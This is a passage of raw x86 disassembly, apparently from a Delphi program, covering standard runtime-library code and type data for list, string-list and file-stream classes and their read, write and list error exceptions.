  40761e:	00 00                	add    %al,(%eax)
  407620:	f4                   	hlt
  407621:	75 40                	jne    0x407663
  407623:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  407627:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  40762b:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  40762f:	00 c0                	add    %al,%al
  407631:	29 40 00             	sub    %eax,0x0(%eax)
  407634:	0a 45 52             	or     0x52(%ebp),%al
  407637:	65 61                	gs popa
  407639:	64 45                	fs inc %ebp
  40763b:	72 72                	jb     0x4076af
  40763d:	6f                   	outsl  %ds:(%esi),(%dx)
  40763e:	72 90                	jb     0x4075d0
	...
  407658:	74 76                	je     0x4076d0
  40765a:	40                   	inc    %eax
  40765b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40765e:	00 00                	add    %al,(%eax)
  407660:	f4                   	hlt
  407661:	75 40                	jne    0x4076a3
  407663:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  407667:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  40766b:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  40766f:	00 c0                	add    %al,%al
  407671:	29 40 00             	sub    %eax,0x0(%eax)
  407674:	0b 45 57             	or     0x57(%ebp),%eax
  407677:	72 69                	jb     0x4076e2
  407679:	74 65                	je     0x4076e0
  40767b:	45                   	inc    %ebp
  40767c:	72 72                	jb     0x4076f0
  40767e:	6f                   	outsl  %ds:(%esi),(%dx)
  40767f:	72 00                	jb     0x407681
	...
  407695:	00 00                	add    %al,(%eax)
  407697:	00 b4 76 40 00 0c 00 	add    %dh,0xc0040(%esi,%esi,2)
  40769e:	00 00                	add    %al,(%eax)
  4076a0:	04 47                	add    $0x47,%al
  4076a2:	40                   	inc    %eax
  4076a3:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  4076a7:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  4076ab:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  4076af:	00 c0                	add    %al,%al
  4076b1:	29 40 00             	sub    %eax,0x0(%eax)
  4076b4:	0a 45 4c             	or     0x4c(%ebp),%al
  4076b7:	69 73 74 45 72 72 6f 	imul   $0x6f727245,0x74(%ebx),%esi
  4076be:	72 90                	jb     0x407650
	...
  4076d8:	fc                   	cld
  4076d9:	76 40                	jbe    0x40771b
  4076db:	00 10                	add    %dl,(%eax)
  4076dd:	00 00                	add    %al,(%eax)
  4076df:	00 3c 10             	add    %bh,(%eax,%edx,1)
  4076e2:	40                   	inc    %eax
  4076e3:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  4076e7:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  4076eb:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  4076ef:	00 80 7a 40 00 f4    	add    %al,-0xbffbf86(%eax)
  4076f5:	7a 40                	jp     0x407737
  4076f7:	00 1c 7b             	add    %bl,(%ebx,%edi,2)
  4076fa:	40                   	inc    %eax
  4076fb:	00 05 54 4c 69 73    	add    %al,0x73694c54
  407701:	74 8b                	je     0x40768e
  407703:	c0 00 00             	rolb   $0x0,(%eax)
  407706:	00 00                	add    %al,(%eax)
  407708:	00 00                	add    %al,(%eax)
  40770a:	00 00                	add    %al,(%eax)
  40770c:	50                   	push   %eax
  40770d:	77 40                	ja     0x40774f
	...
  40771b:	00 44 77 40          	add    %al,0x40(%edi,%esi,2)
  40771f:	00 04 00             	add    %al,(%eax,%eax,1)
  407722:	00 00                	add    %al,(%eax)
  407724:	3c 10                	cmp    $0x10,%al
  407726:	40                   	inc    %eax
  407727:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  40772b:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  40772f:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  407733:	00 c0                	add    %al,%al
  407735:	29 40 00             	sub    %eax,0x0(%eax)
  407738:	a8 7c                	test   $0x7c,%al
  40773a:	40                   	inc    %eax
  40773b:	00 b0 7c 40 00 c4    	add    %dh,-0x3bffbf84(%eax)
  407741:	7b 40                	jnp    0x407783
  407743:	00 0b                	add    %cl,(%ebx)
  407745:	54                   	push   %esp
  407746:	50                   	push   %eax
  407747:	65 72 73             	gs jb  0x4077bd
  40774a:	69 73 74 65 6e 74 07 	imul   $0x7746e65,0x74(%ebx),%esi
  407751:	0b 54 50 65          	or     0x65(%eax,%edx,2),%edx
  407755:	72 73                	jb     0x4077ca
  407757:	69 73 74 65 6e 74 38 	imul   $0x38746e65,0x74(%ebx),%esi
  40775e:	77 40                	ja     0x4077a0
  407760:	00 78 11             	add    %bh,0x11(%eax)
  407763:	40                   	inc    %eax
  407764:	00 00                	add    %al,(%eax)
  407766:	00 07                	add    %al,(%edi)
  407768:	43                   	inc    %ebx
  407769:	6c                   	insb   (%dx),%es:(%edi)
  40776a:	61                   	popa
  40776b:	73 73                	jae    0x4077e0
  40776d:	65 73 00             	gs jae 0x407770
  407770:	00 8d 40 00 00 00    	add    %cl,0x40(%ebp)
  407776:	00 00                	add    %al,(%eax)
  407778:	00 00                	add    %al,(%eax)
  40777a:	00 00                	add    %al,(%eax)
  40777c:	1c 78                	sbb    $0x78,%al
  40777e:	40                   	inc    %eax
	...
  40778b:	00 10                	add    %dl,(%eax)
  40778d:	78 40                	js     0x4077cf
  40778f:	00 08                	add    %cl,(%eax)
  407791:	00 00                	add    %al,(%eax)
  407793:	00 38                	add    %bh,(%eax)
  407795:	77 40                	ja     0x4077d7
  407797:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  40779b:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  40779f:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  4077a3:	00 c0                	add    %al,%al
  4077a5:	29 40 00             	sub    %eax,0x0(%eax)
  4077a8:	a8 7c                	test   $0x7c,%al
  4077aa:	40                   	inc    %eax
  4077ab:	00 90 7e 40 00 b4    	add    %dl,-0x4bffbf82(%eax)
  4077b1:	7d 40                	jge    0x4077f3
  4077b3:	00 3c 78             	add    %bh,(%eax,%edi,2)
  4077b6:	40                   	inc    %eax
  4077b7:	00 44 78 40          	add    %al,0x40(%eax,%edi,2)
  4077bb:	00 48 80             	add    %cl,-0x80(%eax)
  4077be:	40                   	inc    %eax
  4077bf:	00 a4 80 40 00 b8 83 	add    %ah,-0x7c47ffc0(%eax,%eax,4)
  4077c6:	40                   	inc    %eax
  4077c7:	00 e8                	add    %ch,%al
  4077c9:	83 40 00 70          	addl   $0x70,0x0(%eax)
  4077cd:	85 40 00             	test   %eax,0x0(%eax)
  4077d0:	34 86                	xor    $0x86,%al
  4077d2:	40                   	inc    %eax
  4077d3:	00 b4 7c 40 00 d8 7c 	add    %dh,0x7cd80040(%esp,%edi,2)
  4077da:	40                   	inc    %eax
  4077db:	00 fc                	add    %bh,%ah
  4077dd:	7c 40                	jl     0x40781f
  4077df:	00 4c 78 40          	add    %cl,0x40(%eax,%edi,2)
  4077e3:	00 54 78 40          	add    %dl,0x40(%eax,%edi,2)
  4077e7:	00 98 7f 40 00 4c    	add    %bl,0x4c00407f(%eax)
  4077ed:	80 40 00 8c          	addb   $0x8c,0x0(%eax)
  4077f1:	81 40 00 5c 78 40 00 	addl   $0x40785c,0x0(%eax)
  4077f8:	3c 82                	cmp    $0x82,%al
  4077fa:	40                   	inc    %eax
  4077fb:	00 90 82 40 00 3c    	add    %dl,0x3c004082(%eax)
  407801:	83 40 00 60          	addl   $0x60,0x0(%eax)
  407805:	84 40 00             	test   %al,0x0(%eax)
  407808:	b8 84 40 00 1c       	mov    $0x1c004084,%eax
  40780d:	85 40 00             	test   %eax,0x0(%eax)
  407810:	08 54 53 74          	or     %dl,0x74(%ebx,%edx,2)
  407814:	72 69                	jb     0x40787f
  407816:	6e                   	outsb  %ds:(%esi),(%dx)
  407817:	67 73 8d             	addr16 jae 0x4077a7
  40781a:	40                   	inc    %eax
  40781b:	00 07                	add    %al,(%edi)
  40781d:	08 54 53 74          	or     %dl,0x74(%ebx,%edx,2)
  407821:	72 69                	jb     0x40788c
  407823:	6e                   	outsb  %ds:(%esi),(%dx)
  407824:	67 73 a8             	addr16 jae 0x4077cf
  407827:	77 40                	ja     0x407869
  407829:	00 50 77             	add    %dl,0x77(%eax)
  40782c:	40                   	inc    %eax
  40782d:	00 00                	add    %al,(%eax)
  40782f:	00 07                	add    %al,(%edi)
  407831:	43                   	inc    %ebx
  407832:	6c                   	insb   (%dx),%es:(%edi)
  407833:	61                   	popa
  407834:	73 73                	jae    0x4078a9
  407836:	65 73 00             	gs jae 0x407839
  407839:	00 8b c0 e9 d7 af    	add    %cl,-0x50281640(%ebx)
  40783f:	ff                   	(bad)
  407840:	ff 8d 40 00 e9 cf    	decl   -0x3016ffc0(%ebp)
  407846:	af                   	scas   %es:(%edi),%eax
  407847:	ff                   	(bad)
  407848:	ff 8d 40 00 e9 c7    	decl   -0x3816ffc0(%ebp)
  40784e:	af                   	scas   %es:(%edi),%eax
  40784f:	ff                   	(bad)
  407850:	ff 8d 40 00 e9 bf    	decl   -0x4016ffc0(%ebp)
  407856:	af                   	scas   %es:(%edi),%eax
  407857:	ff                   	(bad)
  407858:	ff 8d 40 00 e9 b7    	decl   -0x4816ffc0(%ebp)
  40785e:	af                   	scas   %es:(%edi),%eax
  40785f:	ff                   	(bad)
  407860:	ff 8d 40 00 0e 0b    	decl   0xb0e0040(%ebp)
  407866:	54                   	push   %esp
  407867:	53                   	push   %ebx
  407868:	74 72                	je     0x4078dc
  40786a:	69 6e 67 49 74 65 6d 	imul   $0x6d657449,0x67(%esi),%ebp
  407871:	08 00                	or     %al,(%eax)
  407873:	00 00                	add    %al,(%eax)
  407875:	01 00                	add    %eax,(%eax)
  407877:	00 00                	add    %al,(%eax)
  407879:	00 10                	add    %dl,(%eax)
  40787b:	40                   	inc    %eax
  40787c:	00 00                	add    %al,(%eax)
  40787e:	00 00                	add    %al,(%eax)
  407880:	00 8d 40 00 00 00    	add    %cl,0x40(%ebp)
  407886:	00 00                	add    %al,(%eax)
  407888:	00 00                	add    %al,(%eax)
  40788a:	00 00                	add    %al,(%eax)
  40788c:	3c 79                	cmp    $0x79,%al
  40788e:	40                   	inc    %eax
	...
  40789b:	00 30                	add    %dh,(%eax)
  40789d:	79 40                	jns    0x4078df
  40789f:	00 28                	add    %ch,(%eax)
  4078a1:	00 00                	add    %al,(%eax)
  4078a3:	00 a8 77 40 00 6c    	add    %ch,0x6c004077(%eax)
  4078a9:	2a 40 00             	sub    0x0(%eax),%al
  4078ac:	54                   	push   %esp
  4078ad:	29 40 00             	sub    %eax,0x0(%eax)
  4078b0:	7c 29                	jl     0x4078db
  4078b2:	40                   	inc    %eax
  4078b3:	00 bc 86 40 00 a8 7c 	add    %bh,0x7ca80040(%esi,%eax,4)
  4078ba:	40                   	inc    %eax
  4078bb:	00 90 7e 40 00 b4    	add    %dl,-0x4bffbf82(%eax)
  4078c1:	7d 40                	jge    0x407903
  4078c3:	00 e4                	add    %ah,%ah
  4078c5:	88 40 00             	mov    %al,0x0(%eax)
  4078c8:	0c 89                	or     $0x89,%al
  4078ca:	40                   	inc    %eax
  4078cb:	00 10                	add    %dl,(%eax)
  4078cd:	89 40 00             	mov    %eax,0x0(%eax)
  4078d0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4078d1:	80 40 00 30          	addb   $0x30,0x0(%eax)
  4078d5:	8a 40 00             	mov    0x0(%eax),%al
  4078d8:	78 8a                	js     0x407864
  4078da:	40                   	inc    %eax
  4078db:	00 70 85             	add    %dh,-0x7b(%eax)
  4078de:	40                   	inc    %eax
  4078df:	00 80 8b 40 00 08    	add    %al,0x800408b(%eax)
  4078e5:	87 40 00             	xchg   %eax,0x0(%eax)
  4078e8:	d8 7c 40 00          	fdivrs 0x0(%eax,%eax,2)
  4078ec:	fc                   	cld
  4078ed:	7c 40                	jl     0x40792f
  4078ef:	00 88 87 40 00 c0    	add    %cl,-0x3fffbf79(%eax)
  4078f5:	87 40 00             	xchg   %eax,0x0(%eax)
  4078f8:	18 88 40 00 4c 80    	sbb    %cl,-0x7fb3ffc0(%eax)
  4078fe:	40                   	inc    %eax
  4078ff:	00 58 89             	add    %bl,-0x77(%eax)
  407902:	40                   	inc    %eax
  407903:	00 90 89 40 00 3c    	add    %dl,0x3c004089(%eax)
  407909:	82 40 00 90          	addb   $0x90,0x0(%eax)
  40790d:	82 40 00 3c          	addb   $0x3c,0x0(%eax)
  407911:	83 40 00 60          	addl   $0x60,0x0(%eax)
  407915:	84 40 00             	test   %al,0x0(%eax)
  407918:	b8 84 40 00 1c       	mov    $0x1c004084,%eax
  40791d:	85 40 00             	test   %eax,0x0(%eax)
  407920:	58                   	pop    %eax
  407921:	87 40 00             	xchg   %eax,0x0(%eax)
  407924:	70 87                	jo     0x4078ad
  407926:	40                   	inc    %eax
  407927:	00 7c 88 40          	add    %bh,0x40(%eax,%ecx,4)
  40792b:	00 90 8b 40 00 0b    	add    %dl,0xb00408b(%eax)
  407931:	54                   	push   %esp
  407932:	53                   	push   %ebx
  407933:	74 72                	je     0x4079a7
  407935:	69 6e 67 4c 69 73 74 	imul   $0x7473694c,0x67(%esi),%ebp
  40793c:	07                   	pop    %es
  40793d:	0b 54 53 74          	or     0x74(%ebx,%edx,2),%edx
  407941:	72 69                	jb     0x4079ac
  407943:	6e                   	outsb  %ds:(%esi),(%dx)
  407944:	67 4c                	addr16 dec %esp
  407946:	69 73 74 b8 78 40 00 	imul   $0x4078b8,0x74(%ebx),%esi
  40794d:	1c 78                	sbb    $0x78,%al
  40794f:	40                   	inc    %eax
  407950:	00 00                	add    %al,(%eax)
  407952:	00 07                	add    %al,(%edi)
  407954:	43                   	inc    %ebx
  407955:	6c                   	insb   (%dx),%es:(%edi)
  407956:	61                   	popa
  407957:	73 73                	jae    0x4079cc
  407959:	65 73 00             	gs jae 0x40795c
  40795c:	00 8d 40 00 00 00    	add    %cl,0x40(%ebp)
	...
  407976:	00 00                	add    %al,(%eax)
  407978:	a0 79 40 00 04       	mov    0x4004079,%al
  40797d:	00 00                	add    %al,(%eax)
  40797f:	00 3c 10             	add    %bh,(%eax,%edx,1)
  407982:	40                   	inc    %eax
  407983:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  407987:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  40798b:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  40798f:	00 c0                	add    %al,%al
  407991:	29 40 00             	sub    %eax,0x0(%eax)
  407994:	a8 79                	test   $0x79,%al
  407996:	40                   	inc    %eax
  407997:	00 b0 79 40 00 b8    	add    %dh,-0x47ffbf87(%eax)
  40799d:	79 40                	jns    0x4079df
  40799f:	00 07                	add    %al,(%edi)
  4079a1:	54                   	push   %esp
  4079a2:	53                   	push   %ebx
  4079a3:	74 72                	je     0x407a17
  4079a5:	65 61                	gs popa
  4079a7:	6d                   	insl   (%dx),%es:(%edi)
  4079a8:	e9 6b ae ff ff       	jmp    0x402818
  4079ad:	8d 40 00             	lea    0x0(%eax),%eax
  4079b0:	e9 63 ae ff ff       	jmp    0x402818
  4079b5:	8d 40 00             	lea    0x0(%eax),%eax
  4079b8:	e9 5b ae ff ff       	jmp    0x402818
  4079bd:	8d 40 00             	lea    0x0(%eax),%eax
	...
  4079d8:	00 7a 40             	add    %bh,0x40(%edx)
  4079db:	00 08                	add    %cl,(%eax)
  4079dd:	00 00                	add    %al,(%eax)
  4079df:	00 94 79 40 00 6c 2a 	add    %dl,0x2a6c0040(%ecx,%edi,2)
  4079e6:	40                   	inc    %eax
  4079e7:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  4079eb:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  4079ef:	00 c0                	add    %al,%al
  4079f1:	29 40 00             	sub    %eax,0x0(%eax)
  4079f4:	38 8c 40 00 48 8c 40 	cmp    %cl,0x408c4800(%eax,%eax,2)
  4079fb:	00 58 8c             	add    %bl,-0x74(%eax)
  4079fe:	40                   	inc    %eax
  4079ff:	00 0d 54 48 61 6e    	add    %cl,0x6e614854
  407a05:	64 6c                	fs insb (%dx),%es:(%edi)
  407a07:	65 53                	gs push %ebx
  407a09:	74 72                	je     0x407a7d
  407a0b:	65 61                	gs popa
  407a0d:	6d                   	insl   (%dx),%es:(%edi)
  407a0e:	8b c0                	mov    %eax,%eax
	...
  407a28:	50                   	push   %eax
  407a29:	7a 40                	jp     0x407a6b
  407a2b:	00 08                	add    %cl,(%eax)
  407a2d:	00 00                	add    %al,(%eax)
  407a2f:	00 f4                	add    %dh,%ah
  407a31:	79 40                	jns    0x407a73
  407a33:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  407a37:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  407a3b:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  407a3f:	00 14 8d 40 00 38 8c 	add    %dl,-0x73c7ffc0(,%ecx,4)
  407a46:	40                   	inc    %eax
  407a47:	00 48 8c             	add    %cl,-0x74(%eax)
  407a4a:	40                   	inc    %eax
  407a4b:	00 58 8c             	add    %bl,-0x74(%eax)
  407a4e:	40                   	inc    %eax
  407a4f:	00 0b                	add    %cl,(%ebx)
  407a51:	54                   	push   %esp
  407a52:	46                   	inc    %esi
  407a53:	69 6c 65 53 74 72 65 	imul   $0x61657274,0x53(%ebp,%eiz,2),%ebp
  407a5a:	61 
  407a5b:	6d                   	insl   (%dx),%es:(%edi)
  407a5c:	53                   	push   %ebx
  407a5d:	8b d8                	mov    %eax,%ebx
  407a5f:	8b cb                	mov    %ebx,%ecx
  407a61:	b2 01                	mov    $0x1,%dl
  407a63:	b8 b4 76 40 00       	mov    $0x4076b4,%eax
  407a68:	e8 bf ed ff ff       	call   0x40682c
  407a6d:	e8 a6 b3 ff ff       	call   0x402e18
  407a72:	5b                   	pop    %ebx
  407a73:	c3                   	ret
  407a74:	b8 0c f0 00 00       	mov    $0xf00c,%eax
  407a79:	e8 de ff ff ff       	call   0x407a5c
  407a7e:	c3                   	ret
  407a7f:	90                   	nop
  407a80:	53                   	push   %ebx
  407a81:	56                   	push   %esi
  407a82:	8b da                	mov    %edx,%ebx
  407a84:	8b f0                	mov    %eax,%esi
  407a86:	8b c6                	mov    %esi,%eax
  407a88:	e8 13 00 00 00       	call   0x407aa0
  407a8d:	84 db                	test   %bl,%bl
  407a8f:	74 07                	je     0x407a98
  407a91:	8b c6                	mov    %esi,%eax
  407a93:	e8 14 b1 ff ff       	call   0x402bac
  407a98:	8b c6                	mov    %esi,%eax
  407a9a:	5e                   	pop    %esi
  407a9b:	5b                   	pop    %ebx
  407a9c:	c3                   	ret
  407a9d:	8d 40 00             	lea    0x0(%eax),%eax
  407aa0:	53                   	push   %ebx
  407aa1:	8b d8                	mov    %eax,%ebx
  407aa3:	33 d2                	xor    %edx,%edx
  407aa5:	8b c3                	mov    %ebx,%eax
  407aa7:	e8 cc 00 00 00       	call   0x407b78
  407aac:	33 d2                	xor    %edx,%edx
  407aae:	8b c3                	mov    %ebx,%eax
  407ab0:	e8 8f 00 00 00       	call   0x407b44
  407ab5:	5b                   	pop    %ebx
  407ab6:	c3                   	ret
  407ab7:	90                   	nop
  407ab8:	53                   	push   %ebx
  407ab9:	56                   	push   %esi
  407aba:	8b f2                	mov    %edx,%esi
  407abc:	8b d8                	mov    %eax,%ebx
  407abe:	85 f6                	test   %esi,%esi
  407ac0:	7c 05                	jl     0x407ac7
  407ac2:	3b 73 08             	cmp    0x8(%ebx),%esi
  407ac5:	7c 06                	jl     0x407acd
  407ac7:	8b c3                	mov    %ebx,%eax
  407ac9:	8b 10                	mov    (%eax),%edx
  407acb:	ff 12                	call   *(%edx)
  407acd:	ff 4b 08             	decl   0x8(%ebx)
  407ad0:	8b 43 08             	mov    0x8(%ebx),%eax
  407ad3:	3b f0                	cmp    %eax,%esi
  407ad5:	7d 19                	jge    0x407af0
  407ad7:	2b c6                	sub    %esi,%eax
  407ad9:	8b c8                	mov    %eax,%ecx
  407adb:	c1 e1 02             	shl    $0x2,%ecx
  407ade:	8b 43 04             	mov    0x4(%ebx),%eax
  407ae1:	8d 14 b0             	lea    (%eax,%esi,4),%edx
  407ae4:	8b 43 04             	mov    0x4(%ebx),%eax
  407ae7:	8d 44 b0 04          	lea    0x4(%eax,%esi,4),%eax
  407aeb:	e8 d8 ab ff ff       	call   0x4026c8
  407af0:	5e                   	pop    %esi
  407af1:	5b                   	pop    %ebx
  407af2:	c3                   	ret
  407af3:	90                   	nop
  407af4:	e8 7b ff ff ff       	call   0x407a74
  407af9:	c3                   	ret
  407afa:	8b c0                	mov    %eax,%eax
  407afc:	53                   	push   %ebx
  407afd:	56                   	push   %esi
  407afe:	8b f2                	mov    %edx,%esi
  407b00:	8b d8                	mov    %eax,%ebx
  407b02:	85 f6                	test   %esi,%esi
  407b04:	7c 05                	jl     0x407b0b
  407b06:	3b 73 08             	cmp    0x8(%ebx),%esi
  407b09:	7c 06                	jl     0x407b11
  407b0b:	8b c3                	mov    %ebx,%eax
  407b0d:	8b 10                	mov    (%eax),%edx
  407b0f:	ff 12                	call   *(%edx)
  407b11:	8b 43 04             	mov    0x4(%ebx),%eax
  407b14:	8b 04 b0             	mov    (%eax,%esi,4),%eax
  407b17:	5e                   	pop    %esi
  407b18:	5b                   	pop    %ebx
  407b19:	c3                   	ret
  407b1a:	8b c0                	mov    %eax,%eax
  407b1c:	8b 48 0c             	mov    0xc(%eax),%ecx
  407b1f:	83 f9 08             	cmp    $0x8,%ecx
  407b22:	7e 07                	jle    0x407b2b
  407b24:	ba 10 00 00 00       	mov    $0x10,%edx
  407b29:	eb 11                	jmp    0x407b3c
  407b2b:	83 f9 04             	cmp    $0x4,%ecx
  407b2e:	7e 07                	jle    0x407b37
  407b30:	ba 08 00 00 00       	mov    $0x8,%edx
  407b35:	eb 05                	jmp    0x407b3c
  407b37:	ba 04 00 00 00       	mov    $0x4,%edx
  407b3c:	03 d1                	add    %ecx,%edx
  407b3e:	e8 01 00 00 00       	call   0x407b44
  407b43:	c3                   	ret
  407b44:	53                   	push   %ebx
  407b45:	56                   	push   %esi
  407b46:	8b f2                	mov    %edx,%esi
  407b48:	8b d8                	mov    %eax,%ebx
  407b4a:	3b 73 08             	cmp    0x8(%ebx),%esi
  407b4d:	7c 08                	jl     0x407b57
  407b4f:	81 fe ff ff ff 07    	cmp    $0x7ffffff,%esi
  407b55:	7e 06                	jle    0x407b5d
  407b57:	8b c3                	mov    %ebx,%eax
  407b59:	8b 10                	mov    (%eax),%edx
  407b5b:	ff 12                	call   *(%edx)
  407b5d:	3b 73 0c             	cmp    0xc(%ebx),%esi
  407b60:	74 10                	je     0x407b72
  407b62:	8b d6                	mov    %esi,%edx
  407b64:	c1 e2 02             	shl    $0x2,%edx
  407b67:	8d 43 04             	lea    0x4(%ebx),%eax
  407b6a:	e8 55 aa ff ff       	call   0x4025c4
  407b6f:	89 73 0c             	mov    %esi,0xc(%ebx)
  407b72:	5e                   	pop    %esi
  407b73:	5b                   	pop    %ebx
  407b74:	c3                   	ret
  407b75:	8d 40 00             	lea    0x0(%eax),%eax
  407b78:	53                   	push   %ebx
  407b79:	56                   	push   %esi
  407b7a:	8b f2                	mov    %edx,%esi
  407b7c:	8b d8                	mov    %eax,%ebx
  407b7e:	85 f6                	test   %esi,%esi
  407b80:	7c 08                	jl     0x407b8a
  407b82:	81 fe ff ff ff 07    	cmp    $0x7ffffff,%esi
  407b88:	7e 06                	jle    0x407b90
  407b8a:	8b c3                	mov    %ebx,%eax
  407b8c:	8b 10                	mov    (%eax),%edx
  407b8e:	ff 12                	call   *(%edx)
  407b90:	3b 73 0c             	cmp    0xc(%ebx),%esi
  407b93:	7e 09                	jle    0x407b9e
  407b95:	8b d6                	mov    %esi,%edx
  407b97:	8b c3                	mov    %ebx,%eax
  407b99:	e8 a6 ff ff ff       	call   0x407b44
  407b9e:	8b 43 08             	mov    0x8(%ebx),%eax
  407ba1:	3b f0                	cmp    %eax,%esi
  407ba3:	7e 17                	jle    0x407bbc
  407ba5:	8b 53 04             	mov    0x4(%ebx),%edx
  407ba8:	8d 14 82             	lea    (%edx,%eax,4),%edx
  407bab:	8b ce                	mov    %esi,%ecx
  407bad:	2b c8                	sub    %eax,%ecx
  407baf:	8b c1                	mov    %ecx,%eax
  407bb1:	c1 e0 02             	shl    $0x2,%eax
  407bb4:	33 c9                	xor    %ecx,%ecx
  407bb6:	92                   	xchg   %eax,%edx
  407bb7:	e8 68 ac ff ff       	call   0x402824
  407bbc:	89 73 08             	mov    %esi,0x8(%ebx)
  407bbf:	5e                   	pop    %esi
  407bc0:	5b                   	pop    %ebx
  407bc1:	c3                   	ret
  407bc2:	8b c0                	mov    %eax,%eax
  407bc4:	85 d2                	test   %edx,%edx
  407bc6:	74 06                	je     0x407bce
  407bc8:	92                   	xchg   %eax,%edx
  407bc9:	8b 08                	mov    (%eax),%ecx
  407bcb:	ff 11                	call   *(%ecx)
  407bcd:	c3                   	ret
  407bce:	33 d2                	xor    %edx,%edx
  407bd0:	e8 03 00 00 00       	call   0x407bd8
  407bd5:	c3                   	ret
  407bd6:	8b c0                	mov    %eax,%eax
  407bd8:	55                   	push   %ebp
  407bd9:	8b ec                	mov    %esp,%ebp
  407bdb:	81 c4 ec fe ff ff    	add    $0xfffffeec,%esp
  407be1:	53                   	push   %ebx
  407be2:	56                   	push   %esi
  407be3:	57                   	push   %edi
  407be4:	33 c9                	xor    %ecx,%ecx
  407be6:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  407be9:	8b f2                	mov    %edx,%esi
  407beb:	8b d8                	mov    %eax,%ebx
  407bed:	33 c0                	xor    %eax,%eax
  407bef:	55                   	push   %ebp
  407bf0:	68 8e 7c 40 00       	push   $0x407c8e
  407bf5:	64 ff 30             	push   %fs:(%eax)
  407bf8:	64 89 20             	mov    %esp,%fs:(%eax)
  407bfb:	85 f6                	test   %esi,%esi
  407bfd:	74 1d                	je     0x407c1c
  407bff:	8d 95 fc fe ff ff    	lea    -0x104(%ebp),%edx
  407c05:	8b 06                	mov    (%esi),%eax
  407c07:	e8 08 ad ff ff       	call   0x402914
  407c0c:	8d 95 fc fe ff ff    	lea    -0x104(%ebp),%edx
  407c12:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407c15:	e8 e6 b5 ff ff       	call   0x403200
  407c1a:	eb 0d                	jmp    0x407c29
  407c1c:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407c1f:	ba a4 7c 40 00       	mov    $0x407ca4,%edx
  407c24:	e8 4b b5 ff ff       	call   0x403174
  407c29:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407c2c:	89 85 ec fe ff ff    	mov    %eax,-0x114(%ebp)
  407c32:	c6 85 f0 fe ff ff 0b 	movb   $0xb,-0x110(%ebp)
  407c39:	8d 95 fc fe ff ff    	lea    -0x104(%ebp),%edx
  407c3f:	8b 03                	mov    (%ebx),%eax
  407c41:	e8 ce ac ff ff       	call   0x402914
  407c46:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  407c4c:	89 85 f4 fe ff ff    	mov    %eax,-0x10c(%ebp)
  407c52:	c6 85 f8 fe ff ff 04 	movb   $0x4,-0x108(%ebp)
  407c59:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
  407c5f:	50                   	push   %eax
  407c60:	6a 01                	push   $0x1
  407c62:	b9 00 f0 00 00       	mov    $0xf000,%ecx
  407c67:	b2 01                	mov    $0x1,%dl
  407c69:	b8 a4 4a 40 00       	mov    $0x404aa4,%eax
  407c6e:	e8 29 ec ff ff       	call   0x40689c
  407c73:	e8 a0 b1 ff ff       	call   0x402e18
  407c78:	33 c0                	xor    %eax,%eax
  407c7a:	5a                   	pop    %edx
  407c7b:	59                   	pop    %ecx
  407c7c:	59                   	pop    %ecx
  407c7d:	64 89 10             	mov    %edx,%fs:(%eax)
  407c80:	68 95 7c 40 00       	push   $0x407c95
  407c85:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407c88:	e8 53 b4 ff ff       	call   0x4030e0
  407c8d:	c3                   	ret
  407c8e:	e9 cd b0 ff ff       	jmp    0x402d60
  407c93:	eb f0                	jmp    0x407c85
  407c95:	5f                   	pop    %edi
  407c96:	5e                   	pop    %esi
  407c97:	5b                   	pop    %ebx
  407c98:	8b e5                	mov    %ebp,%esp
  407c9a:	5d                   	pop    %ebp
  407c9b:	c3                   	ret
  407c9c:	ff                   	(bad)
  407c9d:	ff                   	(bad)
  407c9e:	ff                   	(bad)
  407c9f:	ff 03                	incl   (%ebx)
  407ca1:	00 00                	add    %al,(%eax)
  407ca3:	00 6e 69             	add    %ch,0x69(%esi)
  407ca6:	6c                   	insb   (%dx),%es:(%edi)
  407ca7:	00 92 e8 2a ff ff    	add    %dl,-0xd518(%edx)
  407cad:	ff c3                	inc    %ebx
  407caf:	90                   	nop
  407cb0:	c3                   	ret
  407cb1:	8d 40 00             	lea    0x0(%eax),%eax
  407cb4:	53                   	push   %ebx
  407cb5:	56                   	push   %esi
  407cb6:	57                   	push   %edi
  407cb7:	8b fa                	mov    %edx,%edi
  407cb9:	8b d8                	mov    %eax,%ebx
  407cbb:	8b c3                	mov    %ebx,%eax
  407cbd:	8b 10                	mov    (%eax),%edx
  407cbf:	ff 52 10             	call   *0x10(%edx)
  407cc2:	8b f0                	mov    %eax,%esi
  407cc4:	8b cf                	mov    %edi,%ecx
  407cc6:	8b d6                	mov    %esi,%edx
